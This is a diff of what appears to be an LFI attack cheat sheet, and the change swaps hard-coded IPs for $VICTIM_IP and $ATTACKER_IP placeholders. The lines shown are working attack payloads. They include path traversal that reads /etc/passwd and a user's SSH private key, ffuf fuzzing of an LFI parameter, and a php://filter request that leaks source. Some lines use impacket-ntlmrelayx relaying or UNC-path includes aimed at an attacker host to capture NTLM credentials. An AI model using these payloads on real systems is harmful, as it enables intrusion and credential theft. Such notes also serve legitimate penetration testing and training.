@@ -13,7 +13,7 @@ curl http://target/index.php?page=../../../../home/user/.ssh/id_rsa
 http://$VICTIM_IP/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 
 # Automated Scanning
-ffuf -w $WORDLIST_PATH/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.54.208:36613/index.php?view=FUZZ' -fs 1935
+ffuf -w $WORDLIST_PATH/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://$VICTIM_IP:36613/index.php?view=FUZZ' -fs 1935
 
 # Decoder Base64 in index file:
 GET /index.php?page=php://filter/read=convert.base64-encode/resource=index HTTP/1.1
@@ -36,10 +36,10 @@ impacket-ntlmrelayx -smb2support -t smb://<internal-host>
 
 ```bash
 # 2) Trigger the include with a UNC path pointing at your box
-http://target/index.php?page=\\10.10.14.5\share\anything
+http://target/index.php?page=\\$ATTACKER_IP\share\anything
 
 # 3) Slash variations if backslashes get filtered / don't fire
-?page=//10.10.14.5/share/anything
+?page=//$ATTACKER_IP/share/anything
 ?page=%5C%5C10.10.14.5%5Cshare%5Canything
 ```
 
